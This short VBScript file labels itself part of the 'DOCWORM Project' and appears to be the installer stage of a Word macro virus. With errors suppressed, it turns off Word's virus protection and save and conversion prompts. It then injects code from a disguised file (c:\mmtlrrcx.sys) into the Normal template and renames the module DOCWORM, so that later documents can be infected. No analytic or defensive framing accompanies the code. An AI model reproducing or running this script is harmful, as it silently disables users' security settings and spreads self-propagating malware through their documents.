' This is part of the DOCWORM Project
' the way of the bee
On Error Resume Next
set w=createobject("word.application")
w.options.virusprotection=0
w.options.savenormalprompt=0
w.options.confirmconversions=0
if w.normaltemplate.vbproject.vbcomponents(1).name<>"DOCWORM" then
w.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromfile("c:\mmtlrrcx.sys")
w.normaltemplate.vbproject.vbcomponents(1).name="DOCWORM"
end if
w.application.quit
wscript.quit
